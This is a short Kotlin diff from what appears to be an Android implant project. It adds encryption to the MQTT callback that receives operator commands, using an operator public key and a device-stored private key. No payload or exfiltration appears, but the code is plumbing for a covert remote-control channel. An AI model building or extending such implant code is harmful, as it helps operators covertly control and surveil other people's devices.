@@ -2,6 +2,9 @@ package com.cooperthecoder.implant.command
 
 import android.content.Context
 import android.util.Log
+import com.cooperthecoder.implant.Config
+import com.cooperthecoder.implant.crypto.NetworkEncryption
+import com.cooperthecoder.implant.data.SharedPreferencesQuery
 import org.eclipse.paho.android.service.MqttAndroidClient
 import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken
 import org.eclipse.paho.client.mqttv3.MqttCallback
@@ -21,8 +24,12 @@ class CommandMessageCallback(client: MqttAndroidClient, context: Context) : Mqtt
     override fun messageArrived(topic: String, message: MqttMessage) {
         val text = message.payload.toString(Charset.defaultCharset())
         Log.d(TAG, "Received message: $text")
+        val networkEncryption = NetworkEncryption(
+                Config.OPERATOR_PUBLIC_KEY,
+                SharedPreferencesQuery.getPrivateKey(context)
+        )
         val command: Command = try {
-            Command.fromJson(text)
+            Command.fromJson(networkEncryption, text)
         } catch (e: Exception) {
             Log.e(TAG, "Error parsing JSON from: $text.", e)
             e.printStackTrace()
